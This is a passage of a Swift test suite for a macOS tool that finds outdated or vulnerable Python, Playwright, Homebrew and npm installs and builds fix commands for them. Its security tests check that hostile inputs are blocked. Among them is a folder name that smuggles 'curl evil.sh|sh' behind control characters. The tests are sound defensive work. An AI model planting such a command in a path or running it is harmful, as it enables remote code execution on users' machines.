        expect(Commands.commands(for: update(oldPatch, "Remove older copy")).first?.text == "uv python uninstall 3.13.14"
               && Commands.commands(for: update(uvSetuptools, "84.1.0", kind: .security)).first?.text.hasSuffix("/bin/python3.10 -m pip install --upgrade setuptools==84.1.0 --break-system-packages") == true,
               "an older uv Python is removed with uv, and a package in a Python uv manages gets pip's override")
        try? FileManager.default.removeItem(atPath: uvRoot)
        let pyenvRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-pyenv-\(UUID().uuidString)").path
        for folder in ["3.12.1", "3.12.4"] { try FileManager.default.createDirectory(atPath: pyenvRoot + "/" + folder, withIntermediateDirectories: true) }
        expect(Inventory.managedPythons(root: pyenvRoot, manager: "pyenv").map(\.manager) == ["pyenv", "pyenv"], "pyenv versions are all chosen on purpose, so none is an old copy")
        try? FileManager.default.removeItem(atPath: pyenvRoot)

        // Playwright's browsers: a build is in use when a Playwright package lists it, and left over otherwise.
        expect(Playwright.folders([["name": "webkit", "revision": "2370", "revisionOverrides": ["mac14": "2251", "mac14-arm64": "2251"], "browserVersion": "27.2"],
                                   ["name": "chromium-headless-shell", "revision": "1248", "browserVersion": "156.0.8078.4"]]).map(\.folder)
               == ["webkit-2370", "webkit_mac14_special-2251", "webkit_mac14_arm64_special-2251", "chromium_headless_shell-1248"], "browsers.json names the cache folders Playwright uses, including builds kept for older macOS")
        expect(Playwright.kind("chromium_tip_of_tree_headless_shell-1380") == "chromium_tip_of_tree_headless_shell" && Playwright.kind("ffmpeg-1011") == nil && Playwright.kind("chromium-1243.zip") == nil
               && Playwright.name("chromium_tip_of_tree_headless_shell") == "Chromium tip-of-tree headless shell" && Playwright.name("firefox_beta") == "Firefox beta", "build kinds and names; helpers aren't browsers")
        expect(Playwright.owner("/Users/x/.npm/_npx/0c9f2a/node_modules/playwright-core") == ("npx", "/Users/x/.npm/_npx/0c9f2a")
               && Playwright.owner("/opt/homebrew/lib/node_modules/playwright/node_modules/playwright-core").kind == "other", "an npx install is its cache folder, and a global install isn't a project")
        let pwRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-playwright-\(UUID().uuidString)").path
        let pwCache = pwRoot + "/ms-playwright", pwProject = pwRoot + "/site", pwCore = pwProject + "/node_modules/playwright-core"
        for folder in ["ms-playwright/.links", "ms-playwright/chromium-1243/chrome-mac-arm64/Google Chrome for Testing.app/Contents", "ms-playwright/chromium_headless_shell-1243/chrome-headless-shell-mac-arm64",
                       "ms-playwright/chromium_headless_shell-1234/chrome-headless-shell-mac-arm64/resources/accessibility", "ms-playwright/chromium_headless_shell-1300/chrome-headless-shell-mac-arm64",
                       "ms-playwright/firefox-1555/firefox/Nightly.app/Contents", "ms-playwright/webkit-2336/Playwright.app", "ms-playwright/ffmpeg-1011", "site/node_modules/playwright-core"] {
            try FileManager.default.createDirectory(atPath: pwRoot + "/" + folder, withIntermediateDirectories: true)
        }
        func pwWrite(_ path: String, _ text: String) throws { try Data(text.utf8).write(to: URL(fileURLWithPath: pwRoot + "/" + path)) }
        func pwPlist(_ version: String) -> String { #"<?xml version="1.0"?><plist version="1.0"><dict><key>CFBundleShortVersionString</key><string>"# + version + "</string></dict></plist>" }
        try pwWrite("ms-playwright/chromium-1243/chrome-mac-arm64/Google Chrome for Testing.app/Contents/Info.plist", pwPlist("153.0.8010.12"))
        try pwWrite("ms-playwright/chromium_headless_shell-1234/chrome-headless-shell-mac-arm64/resources/accessibility/reading_mode_gdocs_helper_manifest.json", #"{"name":"Reading Mode","version":"151.0.7922.34"}"#)
        try pwWrite("ms-playwright/firefox-1555/firefox/Nightly.app/Contents/Info.plist", pwPlist("157.0"))
        try pwWrite("ms-playwright/.links/0d1f", "/nonexistent/project/node_modules/playwright-core")
        try pwWrite("ms-playwright/.links/7a2c", pwCore + "\n")
        try pwWrite("site/package.json", #"{"devDependencies":{"@playwright/test":"^1.60.0"}}"#)
        try pwWrite("site/pnpm-lock.yaml", "lockfileVersion: '9.0'\n")
        try pwWrite("site/node_modules/playwright-core/package.json", #"{"name":"playwright-core","version":"1.62.0"}"#)
        try pwWrite("site/node_modules/playwright-core/browsers.json", #"{"browsers":[{"name":"chromium-headless-shell","revision":"1300","browserVersion":"155.0.8059.20"},{"name":"firefox","revision":"1555","browserVersion":"157.0"},"#
                    + #"{"name":"webkit","revision":"2336","revisionOverrides":{"mac14-arm64":"2251"},"browserVersion":"27.0"},{"name":"ffmpeg","revision":"1011"}]}"#)
        let (pwItems, pwErrors) = Inventory.playwrightBrowsers(root: pwCache)
        expect(pwErrors.isEmpty && pwItems.map { "\(($0.path as NSString).lastPathComponent) \($0.name) \($0.version) \($0.manager!)" }.sorted() == [
            "chromium-1243 Chromium (Playwright) 153.0.8010.12 playwright-unused", "chromium_headless_shell-1234 Chromium headless shell (Playwright) 151.0.7922.34 playwright-unused",
            "chromium_headless_shell-1243 Chromium headless shell (Playwright) 153.0.8010.12 playwright-unused", "chromium_headless_shell-1300 Chromium headless shell (Playwright) 155.0.8059.20 playwright-pnpm",
            "firefox-1555 Firefox (Playwright) 157.0 playwright-pnpm", "webkit-2336 WebKit (Playwright) 2336 playwright-pnpm"],
               "versions come from each build's app, the headless shell's manifest, browsers.json or the full Chromium of its revision; a dead link uses nothing, and ffmpeg isn't listed")
        let pwShell = pwItems.first { $0.path.hasSuffix("chromium_headless_shell-1300") }!, pwOld = pwItems.first { $0.path.hasSuffix("chromium-1243") }!
        expect(pwShell.location == pwProject && pwShell.package == "@playwright/test" && pwShell.dependency == "dev" && pwShell.note.hasSuffix(", for Playwright 1.62.0 in \(pwProject).")
               && pwOld.note.hasSuffix(". No Playwright on this Mac uses it any more."), "a build in use names the Playwright and project using it, with the project's package and package manager")
        let (pwFound, _) = Inventory.playwrightBrowsers(root: pwCache, found: [Installation(product: "npm:playwright-core", name: "playwright-core", version: "1.62.0", path: pwProject + "/pnpm-lock.yaml#playwright-core", domain: "projects",
                                                                                            ecosystem: "npm", packageName: "playwright-core", manager: "pnpm", location: pwProject)])
        expect(pwFound.filter { $0.manager == "playwright-pnpm" }.count == 3, "a project's playwright-core and the link to it count once")
        try FileManager.default.removeItem(atPath: pwRoot + "/ms-playwright/.links/7a2c")
        let (pwUnlinked, _) = Inventory.playwrightBrowsers(root: pwCache), (pwProjectOnly, _) = Inventory.playwrightBrowsers(root: pwCache, found: [Installation(product: "npm:playwright-core", name: "playwright-core", version: "1.62.0",
                                                                          path: pwProject + "/pnpm-lock.yaml#playwright-core", domain: "projects", ecosystem: "npm", packageName: "playwright-core", manager: "pnpm", location: pwProject)])
        expect(pwUnlinked.allSatisfy { $0.manager == "playwright-unused" } && pwProjectOnly.filter { $0.manager == "playwright-pnpm" }.count == 3,
               "a Playwright Shipshape found in a project keeps its builds in use even without a link")
        let pwUnusedFindings = pwItems.filter { $0.manager == "playwright-unused" }.map { item -> Finding in var finding = Playwright.unused(item); finding.commands = Commands.commands(for: finding); return finding }
        expect(pwUnusedFindings.allSatisfy { $0.kind == .update && $0.fixed == "Delete unused build" } && groupByCommand(pwUnusedFindings).count == 1
               && groupByCommand(pwUnusedFindings)[0].command?.text == "cd \(Shell.quote(pwCache)) && rm -rf chromium-1243 chromium_headless_shell-1234 chromium_headless_shell-1243",
               "unused builds are updates that share one command deleting them from Playwright's cache")
        let pwHits = [NVDHit(id: "CVE-2026-1", fixed: "155.0.8059.39", severity: "HIGH"), NVDHit(id: "CVE-2026-2", fixed: "156.0.8078.79", severity: "CRITICAL"), NVDHit(id: "CVE-2026-3", fixed: "156.0.8078.47", severity: "HIGH")]
        let pwFinding = Finding(source: "nvd:playwright-chromium", installation: pwShell, kind: .security, fixed: "156.0.8078.79", reason: "", action: "", links: [], advisories: pwHits.map(\.id))
        func pwMarked(_ newest: Playwright.Release?, hits: [NVDHit] = pwHits, waiting: [String: Finding] = [:]) -> Finding {
            var findings = [pwFinding]
            Playwright.mark(&findings, newest: newest, hits: { _ in hits }, waiting: waiting)
            findings[0].commands = Commands.commands(for: findings[0])
            return findings[0]
        }
        let pwPartly = pwMarked(Playwright.Release(version: "1.64.1", browsers: ["chromium_headless_shell": "156.0.8078.4"]))
        expect(pwPartly.awaitingFix != true && pwPartly.fixed == "156.0.8078.4" && pwPartly.action.hasPrefix("Playwright 1.64.1 ships Chromium headless shell 156.0.8078.4, which has 1 of these fixes; the other 2 wait for a later release. Update Playwright in this project")
               && pwPartly.commands?.first?.text == "cd \(Shell.quote(pwProject)) && pnpm add -D @playwright/test@latest && pnpm exec playwright install chromium",
               "a build Playwright's newest release partly fixes gets the project's update command and says what's left")
        let pwNone = pwMarked(Playwright.Release(version: "1.64.1", browsers: ["chromium_headless_shell": "155.0.8059.20"]))
        expect(pwNone.awaitingFix == true && pwNone.fixed == "156.0.8078.79, not in Playwright yet" && pwNone.commands == []
               && pwNone.action == "Playwright's newest release, 1.64.1, ships Chromium headless shell 155.0.8059.20, which doesn't have these fixes yet. Shipshape alerts you when a Playwright release has them. "
                  + "Meanwhile, Playwright can run on Google Chrome, which updates itself, if it's installed: choose the chrome channel (channel: 'chrome' in Playwright's config).",
               "a Chromium build whose fixes no Playwright release has waits, with no command, and points to Google Chrome meanwhile")
        var pwFirefox = [Finding(source: "nvd:playwright-firefox", installation: pwItems.first { $0.path.hasSuffix("firefox-1555") }!, kind: .security, fixed: "158.0", reason: "", action: "", links: [])]
        Playwright.mark(&pwFirefox, newest: Playwright.Release(version: "1.64.1", browsers: ["firefox": "157.0"]), hits: { _ in [NVDHit(id: "CVE-2026-9", fixed: "158.0", severity: "HIGH")] })
        expect(pwFirefox[0].awaitingFix == true && !pwFirefox[0].action.contains("Chrome"), "Firefox builds have no Chrome to fall back on")
        expect(pwMarked(Playwright.Release(version: "1.65.0", browsers: ["chromium_headless_shell": "157.0.8103.4"])).action.hasPrefix("Playwright 1.65.0 ships Chromium headless shell 157.0.8103.4, which has these fixes. ")
               && pwMarked(Playwright.Release(version: "1.65.0", browsers: [:])).awaitingFix == true, "a release with every fix says so, and one without the browser can't fix it")
        let pwUnknown = pwMarked(nil), pwStillWaiting = pwMarked(nil, waiting: [pwNone.id: pwNone])
        expect(pwUnknown.awaitingFix != true && pwUnknown.action.hasPrefix("Shipshape couldn't read which browsers Playwright's newest release ships") && pwUnknown.commands?.isEmpty == false
               && pwStillWaiting.awaitingFix == true && pwStillWaiting.fixed == pwNone.fixed && pwStillWaiting.action == pwNone.action, "without Playwright's answer a waiting build keeps waiting and others keep their command")
        var pwNpxShell = pwShell; pwNpxShell.manager = "playwright-npx"; pwNpxShell.location = "/Users/x/.npm/_npx/0c9f2a"
        expect(Commands.commands(for: Finding(source: "nvd:playwright-chromium", installation: pwNpxShell, kind: .security, fixed: "156.0.8078.79", reason: "", action: "", links: [])).first?.text == "rm -rf /Users/x/.npm/_npx/0c9f2a",
               "a build an npx install uses is replaced by deleting that install")
        try? FileManager.default.removeItem(atPath: pwRoot)

        // History: findings open entries, disappear into resolutions, and reappear as new entries.
        let day1 = Date(timeIntervalSince1970: 1_800_000_000), day2 = day1.addingTimeInterval(86_400), day3 = day2.addingTimeInterval(86_400)
        let lockfile = "/work/app/package-lock.json"
        let lodash = Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: lockfile + "#lodash@4.17.20", domain: "projects", packageName: "lodash", manager: "npm", location: "/work/app")
        let lodashNew = Installation(product: "npm:lodash", name: "lodash", version: "4.17.21", path: lockfile + "#lodash@4.17.21", domain: "projects", packageName: "lodash", manager: "npm", location: "/work/app")
        let globalTool = Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/opt/homebrew/lib/node_modules/left-pad", domain: "packages", packageName: "left-pad", manager: "npm-global", location: "/opt/homebrew")
        let droppedProject = Installation(product: "npm:minimist", name: "minimist", version: "0.0.8", path: "/old/site/package-lock.json#minimist@0.0.8", domain: "projects", packageName: "minimist", manager: "npm", location: "/old/site")
        var lodashFinding = update(lodash, "4.17.21", kind: .security); lodashFinding.severity = "HIGH"
        var history: [HistoryEntry] = []
        var log = ScanReport(installations: [lodash, oldNode, sublime, globalTool, droppedProject], findings: [lodashFinding, update(oldNode, "Remove older copy"), update(sublime, "4216"), update(globalTool, "1.3.0", kind: .security), update(droppedProject, "1.2.6", kind: .security)])
        History.update(&history, with: log, projectFolders: ["/work", "/old"], at: day1)
        History.update(&history, with: log, projectFolders: ["/work", "/old"], at: day2)
        expect(history.count == 5 && history.allSatisfy { $0.resolved == nil && $0.firstSeen == day1 && $0.lastSeen == day2 }, "repeat checks refresh open entries instead of adding new ones")
        let sublimeNew = Installation(product: "sublime-text", name: "Sublime Text", version: "Build 4216", path: "/Applications/Sublime Text.app", domain: "apps", package: "sublime-text", manager: "app")
        let toolNew = Installation(product: "npm:left-pad", name: "left-pad", version: "1.1.0", path: globalTool.path, domain: "packages", packageName: "left-pad", manager: "npm-global", location: "/opt/homebrew")
        log = ScanReport(installations: [lodashNew, rebuilt, sublimeNew, toolNew], findings: [update(toolNew, "1.3.0", kind: .security)])
        History.update(&history, with: log, projectFolders: ["/work"], at: day3)
        func entry(_ name: String) -> [HistoryEntry] { history.filter { $0.name == name } }
        expect(entry("lodash").first?.resolution == "Updated to 4.17.21" && entry("lodash").first?.resolved == day3 && entry("lodash").first?.severity == "HIGH", "a fixed project package resolves as updated")
        expect(entry("node").first?.resolution == "Removed", "a cleaned-up older Homebrew copy resolves as removed, not as updated to the active version")
        expect(entry("Sublime Text").first?.resolution == "Updated to Build 4216", "an updated app resolves with its new version")
        expect(entry("minimist").first?.resolution == "Project folder no longer checked", "removing a project folder from the check is not reported as a fix")
        expect(entry("left-pad").count == 2 && entry("left-pad")[0].resolution == "Updated to 1.1.0" && entry("left-pad")[1].resolved == nil && entry("left-pad")[1].version == "1.1.0",
               "a finding still reported after a version change closes the old entry and opens one for the new version")
        log.installations = [toolNew]
        log.findings = []
        History.update(&history, with: log, projectFolders: ["/work"], at: day3)
        expect(entry("left-pad")[1].resolution == "No longer reported", "a finding that goes away with the same version installed says so")
        History.update(&history, with: ScanReport(installations: [], findings: []), projectFolders: ["/work"], at: day3)
        expect(entry("lodash").count == 1, "resolved entries are not reopened or changed by later checks")
        History.update(&history, with: ScanReport(installations: [lodash], findings: [lodashFinding]), projectFolders: ["/work"], at: day3)
        expect(entry("lodash").count == 2 && entry("lodash")[1].resolved == nil, "a finding that comes back starts a new entry")
        expect(History.resolution(of: HistoryEntry(update(globalTool, "1.3.0"), at: day1), in: ScanReport(), projectFolders: []) == "Removed from this Mac", "uninstalled software resolves as removed")
        expect(History.changed(from: "2.0.0", to: "1.9.0") == "Changed to 1.9.0", "a downgrade is not called an update")
        var capped = (0..<12).map { index -> HistoryEntry in var e = HistoryEntry(update(item("p\(index)", "1"), "2"), at: day1); if index < 8 { e.resolved = day1.addingTimeInterval(Double(index)) }; return e }
        History.update(&capped, with: ScanReport(installations: [], findings: (8..<12).map { update(item("p\($0)", "1"), "2") }), projectFolders: [], at: day1, limit: 6)
        expect(capped.count == 6 && capped.filter { $0.resolved == nil }.count == 4 && !capped.contains { $0.name == "p0" || $0.name == "p1" }, "the log keeps open entries and drops the oldest resolved ones past its limit")

        var scoped = HistoryEntry(update(Installation(product: "npm:@types/node", name: "@types/node", version: "1.0.0", path: "/p/package-lock.json#@types/node@1.0.0", domain: "projects"), "2.0.0"), at: day1)
        scoped.command = "cd /p && npm install \"@types/node@2.0.0\""
        let csv = History.csv([scoped]).components(separatedBy: "\n")
        expect(csv.count == 3 && csv[0].hasPrefix("\"Status\",\"Name\"") && csv[1].hasPrefix("\"Open\",\"'@types/node\",\"update\"") && csv[1].hasSuffix("\"cd /p && npm install \"\"@types/node@2.0.0\"\"\"") && csv[1].contains("\"/p/package-lock.json\""),
               "history CSV quotes cells, doubles quotes and neutralizes formula-like names")

        // Renaming: saved state moves from the former folder once, and an existing new folder is never replaced.
        let support = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-test-\(UUID().uuidString)")
        let former = support.appendingPathComponent(StateFolder.formerName)
        try FileManager.default.createDirectory(at: former, withIntermediateDirectories: true)
        try Data("{}".utf8).write(to: former.appendingPathComponent("state.json"))
        let moved = StateFolder.resolve(in: support)
        expect(moved.lastPathComponent == "Shipshape" && FileManager.default.fileExists(atPath: moved.appendingPathComponent("state.json").path) && !FileManager.default.fileExists(atPath: former.path),
               "a pre-release data folder moves to the Shipshape folder")
        try FileManager.default.createDirectory(at: former, withIntermediateDirectories: true)
        expect(StateFolder.resolve(in: support) == moved && FileManager.default.fileExists(atPath: former.path), "an existing Shipshape folder is kept and a leftover old folder is left alone")
        try? FileManager.default.removeItem(at: support)

        // Ownership: commands for software this account can't change are held back, with who owns it and what to do.
        func fakeAccess(_ owners: [String: String], readOnly: Set<String>, children: [String: [String]] = [:]) -> FileAccess {
            FileAccess(user: "sam", exists: { owners[$0] != nil }, canWrite: { !readOnly.contains($0) }, owner: { owners[$0] }, children: { children[$0] ?? [] })
        }
        func projectFinding(_ folder: String) -> Finding {
            var finding = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: folder + "/package-lock.json#lodash@4.17.20", domain: "projects",
                                              ecosystem: "npm", packageName: "lodash", manager: "npm", location: folder, dependency: "direct"), "4.17.21", kind: .security)
            finding.commands = Commands.commands(for: finding)
            return finding
        }
        let theirs = "/Users/alex/Projects/app", mine = "/Users/sam/shop"
        var owned = [projectFinding(theirs), projectFinding(theirs), projectFinding(mine)]
        let otherAccount = fakeAccess([theirs: "alex", theirs + "/package-lock.json": "alex", theirs + "/node_modules": "alex", mine: "sam", mine + "/package-lock.json": "sam"],
                                      readOnly: [theirs, theirs + "/package-lock.json", theirs + "/node_modules"])
        Ownership.restrict(&owned, access: otherAccount)
        expect(owned[0].blocked == "/Users/alex/Projects/app belongs to alex, so this account can't change it. Make the fix from alex's account, or ask them to." && owned[0].commands == [],
               "another account's project keeps its finding but loses the command that would fail")
        expect(owned[2].blocked == nil && owned[2].commands?.first?.text.hasPrefix("cd /Users/sam/shop && npm install") == true, "this account's own project keeps its command")
        let ownedGroups = groupByCommand(owned)
        expect(ownedGroups.count == 2 && ownedGroups[0].findings.count == 2 && ownedGroups[0].command == nil, "blocked findings in one project share a card with no command")
        var rootModules = [projectFinding(mine)]
        Ownership.restrict(&rootModules, access: fakeAccess([mine: "sam", mine + "/package-lock.json": "sam", mine + "/node_modules": "sam", mine + "/node_modules/@babel": "root"],
                                                            readOnly: [mine + "/node_modules/@babel"], children: [mine + "/node_modules": ["@babel", "lodash"]]))
        expect(rootModules[0].blocked?.hasPrefix("/Users/sam/shop/node_modules/@babel belongs to root, usually left by an install run with sudo") == true,
               "an npm scope folder left to root by sudo is caught before npm fails to move packages inside it")
        var brewOwned = [update(Installation(product: "node", name: "node", version: "26.1.0", path: "/opt/homebrew/Cellar/node/26.1.0", domain: "brew", package: "node", manager: "brew"), "26.2.0"),
                         update(Installation(product: "zoom", name: "Zoom", version: "6.0", path: "/Applications/zoom.us.app", domain: "apps", package: "zoom", manager: "app"), "6.1")]
        for index in brewOwned.indices { brewOwned[index].commands = Commands.commands(for: brewOwned[index]) }
        Ownership.restrict(&brewOwned, access: fakeAccess(["/opt/homebrew/Cellar/node": "alex", "/Applications": "root"], readOnly: ["/opt/homebrew/Cellar/node", "/Applications"]))
        expect(brewOwned[0].blocked == "Homebrew on this Mac belongs to alex, so only that account can upgrade it. Run the update from alex's account, or ask them to." && brewOwned[0].commands == [],
               "Homebrew installed by another account: say so instead of offering brew upgrade")
        expect(brewOwned[1].blocked == nil, "apps with their own updaters aren't checked")
        var global = update(Installation(product: "npm:left-pad", name: "left-pad", version: "1.0.0", path: "/usr/local/lib/node_modules/left-pad", domain: "packages",
                                         ecosystem: "npm", packageName: "left-pad", manager: "npm-global", location: "/usr/local/bin/npm"), "1.3.0", kind: .security)
        global.commands = [UpdateCommand(text: "Open the advisory", note: "", kind: "link", target: "https://example.com")] + Commands.commands(for: global)
        var globals = [global]
        Ownership.restrict(&globals, access: fakeAccess(["/usr/local/lib/node_modules": "root"], readOnly: ["/usr/local/lib/node_modules"]))
        expect(globals[0].blocked?.hasPrefix("/usr/local/lib/node_modules belongs to root, so this account can't change it.") == true && globals[0].commands?.map(\.kind) == ["link"],
               "a root-owned global folder keeps vendor links but drops the Terminal command")
        let folders = fakeAccess(["/": "root", theirs: "alex", mine: "sam"], readOnly: ["/", theirs])
        expect(Ownership.folderWarning(theirs, access: folders) == "/Users/alex/Projects/app belongs to alex. Its vulnerabilities are reported, but fixes have to be made from alex's account.",
               "adding another account's folder explains that fixes happen from that account")
        expect(Ownership.folderWarning("/", access: folders) == "/ includes system or Homebrew folders. Those are skipped; projects elsewhere in it are checked." && Ownership.folderWarning(mine, access: folders) == nil,
               "adding the whole disk notes the skipped system folders; your own folder needs no warning")

        // Security: "Open file" only opens plain text files Shipshape found; a repo can't turn it into running a script.
        let openRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-open-\(UUID().uuidString)").resolvingSymlinksInPath().path
        let openProject = openRoot + "/C# app"
        try FileManager.default.createDirectory(atPath: openProject, withIntermediateDirectories: true)
        try Data("{}".utf8).write(to: URL(fileURLWithPath: openProject + "/package.json"))
        try Data("echo hi".utf8).write(to: URL(fileURLWithPath: openRoot + "/payload.command"))
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: openRoot + "/payload.command")
        try FileManager.default.createSymbolicLink(atPath: openProject + "/linked.json", withDestinationPath: openRoot + "/payload.command")
        try Data("x==1".utf8).write(to: URL(fileURLWithPath: openProject + "/run.command"))
        try Data("{}".utf8).write(to: URL(fileURLWithPath: openRoot + "/elsewhere.json"))
        expect(SafeOpen.fileProblem(openProject + "/package.json", folders: [openProject], files: []) == nil, "a plain package.json in a project folder opens")
        expect(SafeOpen.fileProblem(openProject + "/linked.json", folders: [openProject], files: [])?.contains("is a link") == true, "a package.json that links to a script is refused")
        expect(SafeOpen.fileProblem(openProject + "/run.command", folders: [openProject], files: [])?.contains("isn't a plain text file") == true, "a .command file is refused even if not executable")
        expect(SafeOpen.fileProblem(openRoot + "/payload.command", folders: [openRoot], files: []) != nil, "an executable file is refused")
        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [openProject], files: [])?.contains("outside your project folders") == true, "files outside chosen folders are refused")
        expect(SafeOpen.fileProblem(openRoot + "/elsewhere.json", folders: [], files: [openRoot + "/elsewhere.json"]) == nil, "a known MCP settings file opens")
        expect(SafeOpen.appProblem(openRoot + "/Fake.app", roots: [openRoot]) != nil && SafeOpen.appProblem(openProject, roots: [openRoot]) != nil, "only real app bundles in Applications folders open")
        try FileManager.default.createDirectory(atPath: openRoot + "/Real.app", withIntermediateDirectories: true)
        expect(SafeOpen.appProblem(openRoot + "/Real.app", roots: [openRoot]) == nil, "an app bundle in an allowed folder opens")
        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: openProject + "/requirements.txt"))
        var parseErrors: [String] = []
        let hashProject = Inventory.projects([openProject + "/requirements.txt"], errors: &parseErrors)
        let hashFinding = update(hashProject[0], "2.2.5", kind: .security)
        expect(hashProject.first?.sourceFile == openProject + "/requirements.txt" && Commands.commands(for: hashFinding).first?.target == openProject + "/requirements.txt",
               "a # in a folder name no longer cuts the file path short")
        try? FileManager.default.removeItem(atPath: openRoot)

        // Security: invisible characters in a name never reach a command someone pastes into a terminal.
        let trap = "/work/\u{15}curl evil.sh|sh\r"
        var hidden = update(Installation(product: "npm:lodash", name: "lodash", version: "4.17.20", path: trap + "/package-lock.json#lodash@4.17.20", domain: "projects",
                                         ecosystem: "npm", packageName: "lodash", manager: "npm", location: trap, dependency: "direct", file: trap + "/package-lock.json"), "4.17.21", kind: .security)
        hidden.commands = Commands.commands(for: hidden)
        expect(hidden.commands?.contains { $0.kind == nil } == false, "a folder name with control characters gets no Terminal command")
        var hiddenList = [hidden]
        Ownership.restrict(&hiddenList, access: fakeAccess([:], readOnly: []))
        expect(hiddenList[0].blocked?.contains("/work/\u{FFFD}curl evil.sh|sh\u{FFFD} contains invisible characters") == true, "the notice shows where the invisible characters are")
        expect(Commands.hasHiddenCharacters("pkg\u{202E}gpj.exe") && Commands.hasHiddenCharacters("a\u{2028}b") && Commands.hasHiddenCharacters("tab\there"),
               "bidi overrides, line separators and tabs count as hidden")
        expect(!Commands.hasHiddenCharacters("/Users/zoë/Projects/日本 🚀/app"), "ordinary accented, CJK and emoji names are fine")

        // Security: hostile lockfiles can't stall a check or make it read outside the chosen folder.
        let slowStart = Date()
        _ = Lockfiles.requirements(String(repeating: "a[\n", count: 20_000))
        expect(Date().timeIntervalSince(slowStart) < 0.5, "20,000 lines of unclosed brackets parse in well under a second (was about 7.5 s)")
        expect(Lockfiles.requirements("uvicorn[standard] == 0.30.1\nflask==2.0.0 ; python_version > '3.8'\nbroken[\n==1.0\n").map { "\($0.name) \($0.version)" } == ["uvicorn 0.30.1", "flask 2.0.0"],
               "extras, spaces and markers still parse; a bracket can't run onto the next line")
        let readRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-read-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: readRoot + "/app", withIntermediateDirectories: true)
        try Data("flask==2.0.0\n".utf8).write(to: URL(fileURLWithPath: readRoot + "/outside.txt"))
        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/requirements.txt", withDestinationPath: readRoot + "/outside.txt")
        try FileManager.default.createSymbolicLink(atPath: readRoot + "/app/linked", withDestinationPath: readRoot)
        expect(Lockfiles.find(in: readRoot + "/app").isEmpty, "linked lockfiles and linked folders aren't followed")
        expect(Inventory.read(readRoot + "/app/requirements.txt", limit: 1_000) == nil && Inventory.read(readRoot + "/outside.txt", limit: 5) == nil
               && Inventory.read(readRoot + "/outside.txt", limit: 1_000) != nil, "reads refuse links and files over the limit")
        var limitErrors: [String] = []
        _ = Inventory.projects([readRoot + "/app/requirements.txt"], errors: &limitErrors)
        expect(limitErrors.first?.hasPrefix("Skipped") == true, "a linked lockfile is reported as skipped, not read")
        limitErrors = []
        _ = Inventory.projects([readRoot + "/outside.txt", readRoot + "/outside.txt"], errors: &limitErrors, timeLimit: -1)
        expect(limitErrors == ["Stopped reading lockfiles after -1 seconds; 2 not checked"], "reading stops at the time limit and says how many were left")
        try? FileManager.default.removeItem(atPath: readRoot)

        // Security: Homebrew is read from its folders, never by running brew, and only trusted binaries run.
        let brewRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-brew-\(UUID().uuidString)").path
        for folder in ["Cellar/node/26.1.0_1/bin", "Cellar/node/25.0.0", "Cellar/vercel/59.0.0", "Caskroom/zed/0.150.0", "Caskroom/zed/.metadata", "opt", "var/homebrew/pinned"] {
            try FileManager.default.createDirectory(atPath: brewRoot + "/" + folder, withIntermediateDirectories: true)
        }
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/opt/node", withDestinationPath: "../Cellar/node/26.1.0_1")
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/var/homebrew/pinned/node", withDestinationPath: "../../../opt/node")
        try FileManager.default.createSymbolicLink(atPath: brewRoot + "/Cellar/vercel-cli", withDestinationPath: "vercel")
        let (brewItems, brewErrors) = Inventory.homebrew(prefixes: [brewRoot])
        let brewSummary = brewItems.map { "\($0.name) \($0.version) \($0.manager ?? "") \($0.pinned == true ? "pinned" : "")" }.sorted()
        expect(brewErrors.isEmpty && brewSummary == ["Zed 0.150.0 cask ", "node 25.0.0 brew-old pinned", "node 26.1.0 brew pinned", "vercel 59.0.0 brew "],
               "Homebrew folders give the active copy, older copies, pins and casks; renamed-formula links are skipped")
        let probe = brewRoot + "/probe.sh"
        try Data("#!/bin/sh\necho ok\n".utf8).write(to: URL(fileURLWithPath: probe))
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: probe)
        expect(trustedExecutable(probe) && !trustedExecutable(probe, uid: 4242), "a binary is trusted when this account (or root) owns it")
        try FileManager.default.setAttributes([.posixPermissions: 0o775], ofItemAtPath: probe)
        expect(!trustedExecutable(probe), "a binary others can change is not trusted")
        expect((try? command(probe, [])) == nil, "an untrusted binary is never run")
        setenv("SHIPSHAPE_PROBE_SECRET", "1", 1)
        let environment = try command("/usr/bin/env", []).text
        expect(!environment.contains("SHIPSHAPE_PROBE_SECRET") && environment.contains("PATH=/usr/bin:/bin:/usr/sbin:/sbin"), "launched programs get a minimal environment, not the app's")
        try? FileManager.default.removeItem(atPath: brewRoot)

        // Security: names are quoted, MCP options can't smuggle in a key, huge versions are rejected.
        var tilde = update(Installation(product: "npm:~x", name: "~x", version: "1.0.0", path: "/g/lib/node_modules/~x", domain: "packages", ecosystem: "npm", packageName: "~x", manager: "npm-global", location: "/g/bin/npm"), "", kind: .security)
        tilde.malicious = true
        expect(Commands.commands(for: tilde).isEmpty, "a package name starting with ~ (which a shell would expand) gets no command")
        expect(Inventory.mcpPackage(command: "npx", args: ["--api-key", "sk_live_ABC", "@x/server"]) == nil, "an unknown option's value (an API key) is never taken for the package")
        expect(Inventory.mcpPackage(command: "npx", args: ["-y", "@x/server@1.2.3"]).map { $0.spec } == "@x/server@1.2.3"
               && Inventory.mcpPackage(command: "npx", args: ["--registry", "https://r.example", "pkg"]).map { $0.spec } == "pkg"
               && Inventory.mcpPackage(command: "uvx", args: ["--token=abc", "mcp-server-git"]).map { $0.spec } == "mcp-server-git", "known options and option=value forms are still skipped correctly")
        expect(Version("99999999999999999999") == nil && Version("1.99999999999999999999") == nil && Version("1.2.3") != nil, "a version component too large for an integer is rejected, not dropped")
        let now = Date()
